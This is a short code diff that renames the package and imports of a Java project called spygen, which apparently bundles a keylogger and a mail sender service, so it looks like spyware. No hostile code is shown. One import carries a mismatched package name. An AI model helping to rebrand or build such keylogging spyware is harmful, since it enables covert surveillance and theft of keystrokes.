@@ -1,9 +1,9 @@
-package com.houarizegai.spygen;
+package com.elegantmr023.spygen;
 
-import com.houarizegai.spygen.global.Settings;
-import com.houarizegai.spygen.global.Utils;
-import com.houarizegai.spygen.keylogger.Keylogger;
-import com.houarizegai.spygen.mail.SenderService;
+import com.elegant023.spygen.global.Settings;
+import com.elegantmr023.spygen.global.Utils;
+import com.elegantmr023.spygen.keylogger.Keylogger;
+import com.elegantmr023.spygen.mail.SenderService;
 
 import java.util.Scanner;
 import java.util.concurrent.TimeUnit;
